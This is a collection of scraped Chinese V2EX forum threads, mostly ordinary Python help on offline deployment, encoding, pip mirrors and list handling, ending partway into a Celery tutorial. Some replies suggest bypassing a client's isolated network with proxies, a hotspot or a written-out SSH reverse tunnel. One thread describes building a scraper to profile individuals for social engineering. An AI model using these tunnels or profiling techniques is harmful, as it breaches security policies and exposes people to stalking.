{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人小公司开发一枚，工作最近有个项目，在客户纯内网环境部署 web 应用，公司小，没有纯运维，就安排我去了</p>\n<p>没有网！！！从零开始部署，臣妾做不到啊，安装 centos 虚拟机，配置网络，大半天过去了，传文件也是个问题，文件先复制到优盘，优盘再复制到 windows 台式机，在用 secureCRT scp 到虚拟服务器，还要安装什么 winsshd 才能互通。也就是说安装各种应用和依赖包都要这么来一遍。</p>\n<p>本来想 docker 部署，据说没有网络 docker 部署也很麻烦， docker 我也不熟，然后就采用传统方式部署\n安装 mongodb 倒很快，已有的安装文件复制过去就好了\nmysql 就遇到大坑了，安装提示我需要 perl ，安装 perl 又说要 gcc ，安装 gcc 又要 gmp 等等等等，安装过程中各种乱七八糟的错误，无力吐槽\n还有一堆 python 的库需要安装，画面太美不敢看</p>\n<p>楼主现在已疯，表示要放弃了、离职找工作去了，求搭救</p>\n</div></div>"], "reply": "66", "tittle": "吐个槽，纯内网环境部署 python web 应用", "comment": ["其实我不太懂为什么要纯内网。", " 客户有保密要求", "你需要的是现在有网的地方把虚机做好 在放到内网 很多金融环境都没网的", "> 没有网！！！从零开始部署，臣妾做不到啊，安装 centos 虚拟机，配置网络，大半天过去了，传文件也是个问题，文件先复制到优盘，优盘再复制到 windows 台式机，在用 secureCRT scp 到虚拟服务器，还要安装什么 winsshd 才能互通。也就是说安装各种应用和依赖包都要这么来一遍。\r", "\r", "......跟鹅厂的工作流基本一样。如果机器环境可以保证一样，你可以用 Ansible 之类的配置管理工具批量安装这些东西。不过建议还是离职比较好。", " 感觉可以弄一个 centos-everything-ios ，基本可以解决系统依赖问题。", "python 包可以用 freeze 全部输出出来。", " 我就是安装的 centos-everything-ios 啊...", "既然能用虚拟机，你找个有网络的环境，把各种东西都做好， dump 出硬盘镜像。\r", "\r", "然后拿到内网，搞定", " 虚拟机移植？没弄过", " 最后一句话。。。。。。", "virtualenv 安装 copy 过去", " 嗯，这又是另外一个大问题， python 包，上午折腾了半天 virtualenv ，大部分正常，某些包死活装不上，比如 mysql － python ，放弃。。。。。。", " 求指点。给了链接什么的，谢谢", "你先弄个无线网卡联网装好,不也就半天的时间么?", "做成虚拟机镜像拷贝过去……", "亲 , 你需要现在自己的笔记本上 rsync 一个 centos 的 repo 镜像, 然后进入内网环境后把自己的机器作为镜像源. 或者自己弄一个 docker repo, 一个道理", " 客户服务器，不让联网。而且还是在 windows 台式机用管理软件操作", " 很简单\r", "1. 你先看下你用的什么虚拟化软件，在有网环境用同样的软件创建一个虚拟机，装好各种东西\r", "2. 然后将硬盘镜像文件拷到内网，在内网用这个镜像文件也创建一个，就好了", " 我是直接在内网搭了一个 pyenv 源来装环境，搭了一个 pypi 源来装 package 。你如果愿意折腾也可以这么搞。更多见 ", "> 客户服务器，不让联网。而且还是在 windows 台式机用管理软件操作\r", "\r", "离职吧。", "延伸阅读： ", "其实并不复杂，复制过去就行。\r", "\r", "应该是楼主没用和服务器一样的系统。", "docker 本地先做好 mysql,nginx,python web 镜像， export 然后再 import 没难度\r", "关键在于 docker 环境\r", "也可以本地装个光的 ubuntu\r", "apt-get install --print-uri docker-engine\r", "打出来所有需要装的 deb 包的 url\r", "本地下下来再 scp 传装上去\r", "也没难度\r", "centos 类似", "vagrant 也类似\r", "没什么难度\r", "本地 virtual box 里面做好全部环境\r", "做个镜像\r", "服务器上装 vagrant 和 virtual box 就行了\r", "就是麻烦点而已", "用个 container 全部装好放过去。。", "给公安做过内网东西,直接在公司电脑虚拟机部署完成并进行隔离测试,通过后直接在客户机器上安装个虚拟机就好了", "加钱，包硬件。\r", "\r", "直接抱服务器过去。", "就不能找个内网里联网的机器搭个 squid 代理？或者 ss 或者 vpn ? 这点挫折就怕了？", "docker 很好学的", "买个 360 移动 wifi ，。。。接下来，你懂得。。。。。 O(∩_∩)O~", "这有啥难度，只要能 ssh 连进去一切都不是问题\r", "比如你本机开了一个 socks5 代理 端口为 1085\r", "使用 ssh 反向端口映射 将远程主机的 8888 映射到本机的 1085 ssh -R 8888:127.0.0.1:1085 xxx\r", "远程主机测试:curl -x socks5://127.0.0.1:8888 z.cn\r", "然后远程主机就相当于有网络了\r", "\r", "以上示例将 socks5 换成 http 代理就好了  unix 上大多数程序都支持环境变量设置 http 代理", "vmware+虚拟机拷贝", "这个时候 golang 的优势就显现出来了！ 逃~~~~", " 纯内网，不能连外网。", " docker 也要编译，巴拉巴拉，不能联网也很啰嗦", "上面就有解决方法，找到对应的虚拟环境，直接做好虚拟机，导出，然后导入虚拟机，不就完了吗？", "依赖包的问题可以用 ISO 做 Yum 源解决。。。", "内网镜像。", "虚拟机可以在有公网的环境做好再导出，文件复制到移动硬盘，再在纯内网导入。\r", "纯内网就不要 docker 了，不然还得自己搭 docker 依赖的服务。", " docker 不用编译啊，就一个二进制文件， docker 传上去之后，再从外面拉个镜像下来，再传上去，就这么运行了！轻松愉快", "我有类似的经历，方案是：\r", "\r", "=== 本机 ===\r", "0. 准备 ESXI 安装盘\r", "0.1 准备 coreOS 镜像\r", "0.2 封装 docker 镜像\r", "0.3 本机测试 docker on coreOS on VMware 运行情况\r", "0.4 导出 docker \r", "===内网机器===\r", "1.裸机装 ESXI\r", "2.ESXI 导入 coreOS 镜像\r", "3.coreOS 导入 docker 镜像\r", "4.完成\r", "\r", "或者更粗暴的办法：\r", "===本机===\r", "装系统\r", "装环境\r", "装程序\r", "cloneZilla 整个系统镜像\r", "\r", "===内网===\r", "恢复 cloneZilla 镜像\r", "修复启动\r", "完事", "更更更粗暴的办法\r", "===本机===\r", "1.装 virtualbox\r", "2.virtualbox 里装系统，装程序\r", "3.导出 vdi 镜像\r", "\r", "===内网===\r", "1.装 virtualbox\r", "2.导入镜像\r", "3.配好网络\r", "4.完事\r", "\r", "什么？ virtualbox 不稳定？性能不够？\r", "瞎说，你不试试怎么知道。半年不停机没问题~\r", "再说内网系统你确定有性能压力？", "说最后一个方案：\r", "\r", "我今天刚用顺丰发了个配好的服务器去客户那里。。。", "不错了，你这纯内网的环境还可以用虚拟机。如果虚拟机不让用就给你个 centos 让你安装，……", "这种时候 java 和 go 语言的优势就来了，全平台，零依赖", "pyinstaller 打包 python", "docker 导出后再装上不就好了，什么 docker 怎么装？直接下 rpm 呐", "Docker 或者虚拟机", " 他这不一定是技术的问题. 这种全内网的服务器, 不少时候是有审计之类的, 私连外网是严重的安全违规, 被抓了很麻烦.", "用 yum cache 不知道行不行?", "为啥你们都是怪内网，不怪 python 语言呢， python 部署麻烦又不是不知道！\r", "听我的，换成 java,根本不需要装这些东西到服务器！\r", "带个 jdk,tomcat ，打个 war 包过去就能部署了！", "wuwuyun  和 \tlalalakakaka  的方案是比较好的。", "vagrant 即可", "都说了是客户保密需求有人还逼逼离职真有意思……\r", "\r", "我最近也遇到了一个这个需求，客户还是 Windows ，只能直接把所有需要的东西下载 whl 或者自己编出来，然后在虚拟机上测试好然后刻光盘带进去调试", "在你机器上 docker 部署好， save 镜像，带着镜像和 deb ／ rpm 包过去安装好，直接 load", "下载最全的镜像，然后刻盘，带着这个盘去机房。然后设置源为镜像。然后开始玩吧。", "这种情况直接用 Docker 吧，配置好了保存成镜像，到客户那里三分钟就运行起来。", "这时你需要个 4g 手机：）", "运维出身的我，一开始也是负责纯内网环境部署软件，依赖装到哭，心疼楼主一下\r", "如果要批量部署一批机器的话，在内网搭建源站还是很有必要的以后会省很多事情， yum 源 pip 源之类", "用 freeze 啊。编译成 rpm 或者 deb 包。", " golang  这一点的确做得很好。没的说\r", "\r", "\r", "最讨厌 npm 。随便一安装就是 2G 依赖。", " ", " 这里提供了 docker 的离线安装包，镜像的话你本地 build 好然后 docker save 出来 放到服务器上 docker load 就行，你这都嫌麻烦还写个毛代码", "个人经验 老老实实装依赖， 一个一个装  或者你做个本地 yum 库\r", "说 docker 这些的别想的这么容易   如果系统版本不对比如 centos6.5 docker 装不上去，遇到依赖也得一个一个装", "我就没用过能访问外网的机器。线上机器虽然能访问外网但也不能使用 pip 等方式安装。\r", "\r", "慢慢编译呗，缺啥补啥。\r", "话说你自己电脑不能直接 rz 文件到服务器上吗？", " 你既然有 everything iso 就应该去了解一下设置本地源呀，装 gcc perl 完全没有问题", "卖他们一台服务器", " 谢谢楼上各位，最后是这么解决的：\r", "1. 编译器：重装了 centos 系统，所有的附件之类都给装上，这样 gcc 编译器之类的就都有了。\r", "2. python 库：把公司的服务器下的 /usr/lib/python2.7 和 /usr/lib64/python2.7 打包复制到此内网服务器，这样就不用安装了\r", "3. 其他 mysql 、 mongodb 、 nginx 之类：参照官方文档，下载安装文件，复制到内网服务器，采用二进制源码的方式安装\r", "\r", "豁然开朗，之前一直是在网络环境下开发，安装一个东西一个命令搞定，到内网环境下就完全懵逼了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题, 怎么判断一个字符是否为全角还是半角?\n多谢您的回复!</p>\n</div></div>"], "reply": "7", "tittle": "python 怎么判断一个字符是否为全角还是半角?", "comment": ["ord 一下 看是不是在 255 以下？", "判断字符宽度", "按编码", "ASCII 大于 128", "参考 ", "\r", "\r", "半角字符使用 ord 返回对应的值,  全角字符使用 ord 会报异常.\r", "\r", "也可以使用 unicode 值判断", "转为 gb18030 编码,然后查看长度,等于 2 的就是全角,等于 1 的就是半角,这也是全角半角的本意吧", "使用 len() 方法，返回字符长度，长度为 1 的是半角，长度为 2 为全角。\r", "\r", "不知这样是否可行？"]},
{"content": ["<div class=\"topic_content\">什么情况下使用 slug 是合理的？</div>"], "reply": "1", "tittle": "django 中的 slug 有什么用？应用场景是什么？", "comment": ["对于确定不变的字符串可以作为 slug 放到 url 中，类似于 id 的作用？"]},
{"content": ["<div class=\"topic_content\">比如一个字符串：\r<br>a = '哈哈'\r<br>\r<br>解码后 a.decode('utf-8')输出的是：\r<br>u'\\u54c8\\u54c8'\r<br>\r<br>但是现在接收到的字符串是  '\\u54c8\\u54c8'  这种类型的，看起来是 unicode 的字节，但是是 str 类型， 该怎样处理呢</div>"], "reply": "2", "tittle": "python2 编码问题请教", "comment": ["'\\u54c8\\u54c8'.decode('unicode-escape')", " 多谢~~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>经过两个月，我的第一个深度学习教程《 TF Girls 修炼指南》终于制作完了！</p>\n<p>教程属于新手入门编程向，这里给大家分享一下。</p>\n<p>视频： <a href=\"http://space.bilibili.com/16696495/#!/channel-detail/1588/1/0\" rel=\"nofollow\">space.bilibili.com/16696495/#!/channel-detail/1588/1/0</a>\n代码： <a href=\"http://github.com/CreatCodeBuild/TensorFlow-Chinese-Tutorial\" rel=\"nofollow\">github.com/CreatCodeBuild/TensorFlow-Chinese-Tutorial</a></p>\n<p>喜欢的话赏我一个星并 Follow 一个哦！</p>\n</div></div>"], "reply": "29", "tittle": "[深度学习 与 TensorFlow 入门教程] 《TF Girls 修炼指南 》终于做完了！", "comment": ["不错，最近刚好想学习 ML ，请问下楼主学习这些需要什么样的基础啊？", " 如果你只是想实践一下，不想深究理论（比如我自己）的话。\r", "理论基础（必要）：线性代数，统计概率，微积分。\r", "理论基础（更好）：函数分析，数值分析\r", "编程基础：基本编程能力，最好是 Python 。因为很多库用 Python 。当然，编程能力多多益善。", "感谢 Up 主~~", "感谢楼主，最近刚看 tl 。", "说错了，是 tf😂", "感谢 LZ ，我也一直想试试掏粪(TF)的感觉~~", " 请问楼主这些基础课程你是怎么学习的啊？😨", "跟着我左手", "有空看下，感谢 LZ", " 来，来个慢动作。左手右手都放在下面。。。", " 大学时代总是学过一些的。然后基础不牢固可以上公开课。编程的话，天天写代码自然就上去了。推荐你上 Udacity 的课，上面从理论到实践代码的课都有。", " 吃饭之前洗手就好", "感谢，回去看", "最近一直在看楼主的这个视频，支持", "楼主讲课很有水平，赞一个", "赞！", "TF girls ML 指南。", "给力👏", "马了很久了，赞一个", "一直有在看哦，支持", "顶", "我要给楼主投硬币，哈哈", "感觉把 tf 的例子跑跑就学的差不多了", "特别感谢，最近刚开始看这些", "赞一个", "支持", "感谢", "感谢楼主，有没电子书 👏", "传个百度盘呗"]},
{"content": ["<div class=\"topic_content\">比如我有一个 table 有 10 个列分别是 column1 、 column2 、……、 column10\r<br>我想用哪一列筛就能用哪一列，想用几列就用几列，可以动态添加条件</div>"], "reply": "5", "tittle": "谁知道 django 有没有强大一些的筛选器插件", "comment": ["貌似 django-admin 没有那么自由。 mark 一下。坐等老司机指点。", " 这个还是要在代码里写死哪些域作为过滤器，我希望是动态添加", " 你把所有的列都作为筛选条件,然后想用哪一列作为筛选就用哪一列,可以先看看文档", " 这个我知道，我的需求就是这样的，我是希望有那么一个插件，能让我随意点选用哪一列作为筛选，有没有这样的插件"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>credentials = ServiceAccountCredentials.from_p12_keyfile(\n        SERVICE_ACCOUNT_EMAIL, KEY_FILE_LOCATION, scopes=SCOPES)\n\n# 设置代理 Goproxy 127.0.0.1 8087\nsocks.setdefaultproxy(socks.PROXY_TYPE_HTTP, proxy_host, proxy_port)\nsocks.wrapmodule( httplib2)\n\nhttp = credentials.authorize( httplib2.Http(timeout=35))\n\nanalytics = build('analytics', 'v4', http=http,\n                      discoveryServiceUrl=DISCOVERY_URI)\n\n</code></pre>\n<p>goproxy会有错误，因为证书的原因。</p>\n<p>ssl.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:645)</p>\n<p>有人遇到过类似问题没，怎么解决？</p>\n</div></div>"], "reply": "1", "tittle": "碰下运气，看有人能把这个问题解决吗？", "comment": ["顺便说下：\r", "disable_ssl_certificate_validation=True 没任何作用的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>假设现在有数组\n<code>arr = [96, 79, 125, 89]</code></p>\n<p>数组内的每个数的 16 进制数分别为 60, 4f, 7d, 59</p>\n<p>而字符串“你好”的 unicode 编码是 '\\u4f60\\u597d'</p>\n<p><strong>问：怎么将十进制数组转换成 unicode 字符？</strong>（希望是由内置的函数去转换，手动拼接的话太蓝瘦了）</p>\n<p>详情：这是我在通过 pywin32 的 SendMessage 获取文本框内容时遇到的问题，因为因为是用 PyBuffer 来接收返回的内容，所以得到的是一个数组，很纠结怎么转换成字符</p>\n</div></div>"], "reply": "8", "tittle": "python3 编码转换问题😂十进制数组转 unicode", "comment": ["~> python3\r", "Python 3.5.2 (default, Sep 14 2016, 11:28:32) \r", "[GCC 6.2.1 20160901 (Red Hat 6.2.1-1)] on linux\r", "Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r", ">>> import struct\r", ">>> arr = [96, 79, 125, 89]\r", ">>> struct.pack('B' * len(arr), *arr).decode('utf-16')\r", "'你好'\r", ">>>", "或者直接\r", ">>> bytes(arr).decode('utf-16')\r", "'你好'", "需要澄清的一個問題是，「字符串“你好”的 unicode 编码是 '\\u4f60\\u597d'」表述有誤。\r", "Unicode 是字符集，它只負責對每一個符號賦於一個編號，並不關心這個符號的二進制表示行式。\r", "而樓主的需求是，對一串 bytes 按 UTF-16 進行解碼（ decode ）。\r", "Unicode 是字符集(charset)， UTF 是編碼(encoding)，不要搞混了。", " 嗯嗯，谢谢耐心科普！！！！", "如楼上所述， unicode 是个字符集，是个“类映射表”概念， ucs2, utf-7/8/16/32 等等才能称为编码\r", "\r", "一般处理字符串的话， 2L 所写 bytes 比较方便，但主楼所写场景，如果考虑有可能其他混合数据， 1L 所写 struct 可能更适合", "哦對了， UTF-16 有一個討厭的問題，就是分大小端序（ endianness ）。\r", "題主的例子是小端序(little endian ， UTF-16LE)的，即每一個字符低位 byte 在前，高位 byte 在後（「你好」對應 60, 4f, 7d, 59 ）。\r", "還有一種是大端序(big endian ， UTF-16BE)，即每一個字符高位 byte 在前，低位 byte 在後（「你好」對應 4f, 60, 59, 7d ）。\r", "\r", "同樣的， UTF-32 也分大小端序。不過 UTF-8 不分大小端序。", " 嗯嗯， 1L 和 2L 的方法都方便，我暂时还没有数据混合，所以 2L 的够用了。你们这些概念好透彻啊，我是刚从事 python 开发，太小白了。", " 对，我也发现了，所以如果实在没有办法了，就先将两个整数换顺序，然后转到 16 进制，再拼接成 unicode 字符的表示形式😛"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>bogon:~ ansheng$ pip install --upgrade pip\nYou are using pip version 7.1.0, however version 9.0.1 is available.\nYou should consider upgrading via the 'pip install --upgrade pip' command.\nCollecting pip\n  Downloading pip-9.0.1-py2.py3-none-any.whl (1.3MB)\n    0% |                                | 4.1kB 17.7MB/s eta 0:00:01Exception:\nTraceback (most recent call last):\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/basecommand.py\", line 223, in main\n    status = self.run(options, args)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/commands/install.py\", line 282, in run\n    requirement_set.prepare_files(finder)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/req/req_set.py\", line 334, in prepare_files\n    functools.partial(self._prepare_file, finder))\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/req/req_set.py\", line 321, in _walk_req_to_install\n    more_reqs = handler(req_to_install)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/req/req_set.py\", line 491, in _prepare_file\n    session=self.session)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/download.py\", line 825, in unpack_url\n    session,\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/download.py\", line 673, in unpack_http_url\n    from_path, content_type = _download_http_url(link, session, temp_dir)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/download.py\", line 886, in _download_http_url\n    _download_url(resp, link, content_file)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/download.py\", line 621, in _download_url\n    for chunk in progress_indicator(resp_read(4096), 4096):\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/utils/ui.py\", line 133, in iter\n    for x in it:\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/download.py\", line 586, in resp_read\n    decode_content=False):\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/_vendor/requests/packages/urllib3/response.py\", line 307, in stream\n    data = self.read(amt=amt, decode_content=decode_content)\n  File \"/Library/Python/2.7/site-packages/pip-7.1.0-py2.7.egg/pip/_vendor/requests/packages/urllib3/response.py\", line 267, in read\n    raise ReadTimeoutError(self._pool, None, 'Read timed out.')\nReadTimeoutError: HTTPSConnectionPool(host='pypi.python.org', port=443): Read timed out.\n</code></pre>\n<p>坑大了,每次都装不上。</p>\n</div></div>"], "reply": "16", "tittle": "pip 安装包时 Read timed out 你们都是怎么解决的？", "comment": ["proxychains", "pip3 install --index-url ", " scipy", "换源", " thx,用好了，\r", "\r", "```bash\r", "sudo pip install --index-url ", " ipython\r", "sudo pip install --index-url ", " --upgrade pip\r", "```", "proxychains4", "export ALL_PROXY=socks5://127.0.0.1:1080", " \r", " \r", "这是什么鬼？", " 大神，这个意思是所有的网络都走代理吗？", "proxychains 完美解决\r", "proxychains 只对当前命令起作用……", "可以考虑国内的源  豆瓣的就不错 目前一直在用", "pip 源更改设置\r", "\r", "pipy 国内镜像目前有：\r", "\r", "　　 ", " 豆瓣\r", "\r", "　　 ", " 华中理工大学\r", "\r", "　　 ", " 山东理工大学\r", "\r", "　　 ", " 中国科学技术大学\r", "\r", "手动指定源：\r", "\r", "在 pip 后面跟-i 来指定源，比如用豆瓣的源来安装 web.py 框架：\r", "\r", "pip install web.py -i ", "\r", "\r", "注意后面要有 /simple 目录！！！\r", "\r", "配置文件\r", "\r", "需要创建或修改配置文件（ linux 的文件在~/.pip/pip.conf ， windows 在%HOMEPATH%\\pip\\pip.ini ），修改内容为：\r", "\r", "[global]\r", "index-url = ", "\r", "[install]\r", "\r", "如果不加后面的 install \r", "则需要每次在命令后面加上 --trusted-host", "$ cat ~/.pip/pip.conf\r", "[global]\r", "proxy = 127.0.0.1:50443", "我只是增加一个--timeout 60 ，迟早操作会完成。 pypi 毕竟没被墙", " 收藏了\r", " 是的", " 赞"]},
{"content": ["<div class=\"topic_content\">有这样一个列表，里面只有两种元素 0,1 。例如[0,1,0,0,0,1,1,1,0,0,1]，要将这个列表分割得到以下列表[[0],[1],[0,0,0],[1,1,1],[0,0],[1]]。就是将列表里面连续的元素放入一个个子列表里。不知道能不能用 lambda 列表推导式求出？</div>"], "reply": "16", "tittle": "分割列表", "comment": ["能。", "reduce?", "l = [0,1,0,0,0,1,1,1,0,0,1]\r", "l1 = [(l[i], i) for i in xrange(len(l)) if i == len(l) - 1 or l[i] != l[i+1]]\r", "l2 = [([l1[i][0]] * (l1[i][1] + 1 if i == 0 else l1[i][1] - l1[i-1][1])) for i in xrange(len(l1))]\r", "\r", "根本不值得这样写，可读性为 0 。。", "l = [0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1]\r", "\r", "[[l[j]]*(i-j) for i,j in zip([i for i in range(len(l)) if l[i] != l[i-1]][1:] + [len(l)] , [i for i in range(len(l)) if l[i] != l[i-1]])]\r", "\r", "方法和楼上类似，不推荐这么做，写完我都晕了", "l = [0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1]\r", "\r", "def func(x, y): \r", "　　 try:\r", "　　　　 if x[-1][-1] != y:\r", "　　　　 x.append([y])\r", "　　 else:\r", "　　　　 x[-1].append(y)\r", "　　 except IndexError:\r", "　　　　 x.append([y])\r", "　　 return x\r", "\r", "res = reduce(func, l, [])\r", "\r", "撸了个 reduce 版的😂", " \r", "\r", "缩进缩错了 - - ，改正\r", "\r", "l = [0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1]\r", "\r", "def func(x, y):\r", "　　 try:\r", "　　　　 if x[-1][-1] != y:\r", "　　　　 　　 x.append([y])\r", "　　 　　 else:\r", "　　　　 　　 x[-1].append(y)\r", "　　 except IndexError:\r", "　　　　 x.append([y])\r", "　　 return x\r", "\r", "res = reduce(func, l, [])", " 你这个方法比上面的大概快 100%", "  怎么在回复里缩进的？", " \r", "\r", "我是复制到浏览器里手动打全角空格，所以我上面还打错了 😑", "不要为了追求技巧。。就简简单单的 for 循环能搞定的事情。。。\r", "a=[0,1,0,0,0,1,1,1,0,0,1]\r", "b=[]\r", "for i in a:\r", "__if b and b[-1][0] == i:\r", "____b[-1].append(i)\r", "__else:\r", "____b.append([i])\r", "\r", "可读性秒杀楼上方法", "似乎内置的 groupby 函数可以做这件事：\r", "\r", "from itertools import groupby\r", "a = [0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1] \r", "b = [list(it) for key, it in groupby(a)]", "def gen(l):\r", "    assert len(l) > 0\r", "    curr = l[0]\r", "    cnt = 1\r", "    for i in range(1, len(l)):\r", "        if l[i] == curr:\r", "            cnt += 1\r", "        else:\r", "            yield [curr] * cnt\r", "            curr = l[i]\r", "            cnt = 1\r", "    yield [curr] * cnt\r", "\r", "得到 1 个生成器可供迭代", "def gen(l): \r", "　　 assert len(l) > 0 \r", "　　 curr = l[0] \r", "　　 cnt = 1 \r", "　　 for i in range(1, len(l)): \r", "　　　　 if l[i] == curr: \r", "　　　　　　 cnt += 1 \r", "　　　　 else: \r", "　　　　　　 yield [curr] * cnt \r", "　　　　　　 curr = l[i] \r", "　　　　　　 cnt = 1 \r", "　　 yield [curr] * cnt \r", "\r", "得到 1 个生成器可供迭代", " 666", " 最佳", " +1"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初学 python</p>\n<pre><code>在试着写微博的爬虫，然后发现网页版贼难爬，就打算对手机版下手。\n因为我是百度链接跳进去的，所以我想问问大佬们有没有什么办法可以直接返回跳转后 url 里的参数啊\n那个 id 正好就能构造手机版的 url\n</code></pre>\n</div></div>"], "reply": "17", "tittle": "python 微博爬虫", "comment": ["嗯，在 js 脚本里找到了 id 了，但是登陆还是得登陆。。。我去想想怎么构造 headers", "用 API 不好吗", "因为是想做一个定向社工的工具，先调用搜索引擎，再进各个 SNS 爬记录，爬虫会很小，就没考虑 api", "登陆的密码那里有坑，小心", "我爬过， 用 pyspider 直接爬网页版， 不用登录", "一些 app 的 ua 可以少很多验证\r", "zhifubao", " 正在尝试模拟登陆...很好奇为啥 cookie 解决不了，还是我太菜了...", " 因为是练手项目所以打算慢慢撸", " zhifubao 啊 spider 啊这样的还是会被新浪拦住的\r", "\r", "\r", "urllib2.HTTPError: HTTP Error 403: Forbidden", " 这个是可以的，可以看看其他和新浪有合作的公司。。。不能说太多了。。。一个朋友告诉我的", "刚刚做了微博的模拟登录。 lz 有啥问题可以直接抛出来。", " 还是想知道。。。其实就是要走商业合作这条路？", " 那我多试试别的 uaQAQ", " 膜拜大佬，我用谷歌浏览器开隐私模式就会发现微博可以不登陆就看嘛，就是先会被定位到 sina visitor system 然后再回首页。但是我就是总被拦在 sina visitor system 里， headers 设置了很多次了还是出不去。求教正确进入姿势....", " 是啊，商业合作的，这个是确认的", "前段时间无聊撸了个帐号密码登录（暂不支持登录验证码）加上天气 API ，每天自动发送天气预报微博。\r", "脚本登录的话还是比较简单的，后面想着再加上微博各种基本功能（转发、回复、关注什么的），不过懒而且没什么时间一直拖着。。。欢迎交流", "微博卡住没动，撸了个贴吧的，输入 qq 手机或者类似信息，返回疑似用户，选择是否爬取该用户所有发言。期末渡劫，寒假再继续，占个坑。"]},
{"content": ["<div class=\"topic_content\">C++ 中有结构 B\r<br>// POINT 为 GDI 的一个结构 struct POINT {int x,int y};\r<br>struct B{\r<br>POINT  a1;\r<br>int c;\r<br>};\r<br>\r<br>用 boost.python 把 B 结构导出 \r<br>\tclass_&lt;B&gt;(\"B\")\r<br>\t\t.def_readwrite(\"c\",&amp;B::c)\r<br>\t\t.def_readwrite(\"a1\",&amp;B::a1)\r<br>\t\t;\r<br>那么在 python 中怎么 对 a1.x 读写呢？直接操作 a1.x 会出错</div>"], "reply": "3", "tittle": "请教个 boost.python 的导出嵌套结构到 python 脚本中怎么访问的问题", "comment": ["解决了,把 POINT 也用导出就行了.不过这样感觉一旦用到复杂一点的结构还真是累人", "可以试试 cython, 更容易维护, 几乎照抄 C/C++头文件, 也有一些自动化工具,  从 .h 直接生成 .pxd\r", "\r", " 好的，多谢，回头我去看看去,又碰到 boost python 参数引用和指针 怎么声明的问题了，头大。帮助文档也没找到详细解释。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>Celery</h1>\n<p>在程序的运行过程中，我们经常会碰到一些耗时耗资源的操作，为了避免它们阻塞主程序的运行，我们经常会采用多线程或异步任务。比如，在 Web 开发中，对新用户的注册，我们通常会给他发一封激活邮件，而发邮件是个 IO 阻塞式任务，如果直接把它放到应用当中，就需要等邮件发出去之后才能进行下一步操作，此时用户只能等待再等待。更好的方式是在业务逻辑中触发一个发邮件的异步任务，而主程序可以继续往下运行。</p>\n<p><a href=\"https://github.com/celery/celery\" rel=\"nofollow\">Celery</a> 是一个强大的分布式任务队列，它可以让任务的执行完全脱离主程序，甚至可以被分配到其他主机上运行。我们通常使用它来实现异步任务（ async task ）和定时任务（ crontab ）。它的架构组成如下图：</p>\n<p><img alt=\"Celery_framework\" src=\"https://ooo.0o0.ooo/2016/12/10/584bbf78e1783.png\"></p>\n<p>可以看到， Celery 主要包含以下几个模块：</p>\n<ul>\n<li>\n<p>任务模块</p>\n<p>包含异步任务和定时任务。其中，<strong>异步任务通常在业务逻辑中被触发并发往任务队列，而定时任务由 Celery Beat 进程周期性地将任务发往任务队列</strong>。</p>\n</li>\n<li>\n<p>消息中间件 Broker</p>\n<p>Broker ，即为任务调度队列，<strong>接收任务生产者发来的消息（即任务），将任务存入队列</strong>。 Celery 本身不提供队列服务，官方推荐使用 RabbitMQ 和 Redis 等。</p>\n</li>\n<li>\n<p>任务执行单元 Worker</p>\n<p>Worker 是执行任务的处理单元，<strong>它实时监控消息队列，获取队列中调度的任务，并执行它</strong>。</p>\n</li>\n<li>\n<p>任务结果存储 Backend</p>\n<p>Backend 用于<strong>存储任务的执行结果</strong>，以供查询。同消息中间件一样，存储也可使用 RabbitMQ, Redis 和 MongoDB 等。</p>\n</li>\n</ul>\n<h1>异步任务</h1>\n<p>使用 Celery 实现异步任务主要包含三个步骤：</p>\n<ol>\n<li>创建一个 Celery 实例</li>\n<li>启动 Celery Worker</li>\n<li>应用程序调用异步任务</li>\n</ol>\n<h2>快速入门</h2>\n<p>为了简单起见，对于 Broker 和 Backend ，这里都使用 redis 。在运行下面的例子之前，请确保 redis 已正确安装，并开启 redis 服务，当然， celery 也是要安装的。可以使用下面的命令来安装 celery 及相关依赖：</p>\n<pre><code>$ pip install 'celery[redis]'\n</code></pre>\n<h3>创建 Celery 实例</h3>\n<p>将下面的代码保存为文件 <code><a href=\"http://tasks.py\" rel=\"nofollow\">tasks.py</a></code>：</p>\n<pre><code># -*- coding: utf-8 -*-\n\nimport time\nfrom celery import Celery\n\nbroker = 'redis://127.0.0.1:6379'\nbackend = 'redis://127.0.0.1:6379/0'\n\napp = Celery('my_task', broker=broker, backend=backend)\n\n@app.task\ndef add(x, y):\n    time.sleep(5)     # 模拟耗时操作\n    return x + y\n</code></pre>\n<p>上面的代码做了几件事：</p>\n<ul>\n<li>创建了一个 Celery 实例 app ，名称为 <code>my_task</code>；</li>\n<li>指定消息中间件用 redis ， URL 为 <code>redis://127.0.0.1:6379</code>；</li>\n<li>指定存储用 redis ， URL 为 <code>redis://127.0.0.1:6379/0</code>；</li>\n<li>创建了一个 Celery 任务 <code>add</code>，当函数被 